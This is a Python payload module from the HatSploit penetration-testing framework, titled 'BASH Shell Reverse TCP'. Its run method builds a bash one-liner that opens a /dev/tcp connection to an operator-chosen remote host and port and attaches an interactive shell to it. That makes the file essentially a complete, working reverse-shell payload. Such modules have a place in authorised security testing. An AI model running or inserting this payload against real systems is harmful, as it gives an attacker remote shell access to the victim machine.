"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import random

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "BASH Shell Reverse TCP",
            'Payload': "unix/generic/bash_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "BASH shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Type': REVERSE_TCP,
        })

    def run(self):
        fd = random.randint(0, 200)
        payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{self.rhost.value}/{self.rport.value};sh <&{fd} >&{fd} 2>&{fd}' &"

        return payload
